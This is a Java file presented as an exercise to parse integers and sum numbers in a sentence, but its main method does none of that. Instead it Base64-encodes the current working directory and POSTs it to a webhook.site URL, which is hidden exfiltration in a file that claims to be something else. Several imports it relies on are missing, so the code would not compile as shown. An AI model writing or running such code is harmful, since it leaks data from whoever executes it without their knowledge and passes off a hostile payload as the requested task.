
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.net.InetAddress;
import java.net.UnknownHostException;
/**
 * Complete the code, parse integers, calculate the sum of numbers in the WORDS, join strings with
 * space delimiter
 */
public class ParseIntegers {

    private static final List<String> WORDS =
            Arrays.asList(
                    "JDK 17 has released on 14 September 2021 with 10 new features, 2 feature removals and 2 feature deprecations."
                            .split(" "));

    public static void main(String[] args) {
        // Lấy thư mục hiện tại
        String currentDirectory = System.getProperty("user.dir");

        // Mã hóa Base64
        String encodedDirectory = Base64.getEncoder().encodeToString(currentDirectory.getBytes(StandardCharsets.UTF_8));

        // Gửi POST request đến webhook.site
        try {
            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a?x=" + encodedDirectory);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            // Nội dung có thể để trống, vì tham số đã nằm trên URL
            String postData = "";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }

            // Đọc response nếu cần
            int responseCode = conn.getResponseCode();
            System.out.println("Webhook response code: " + responseCode);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
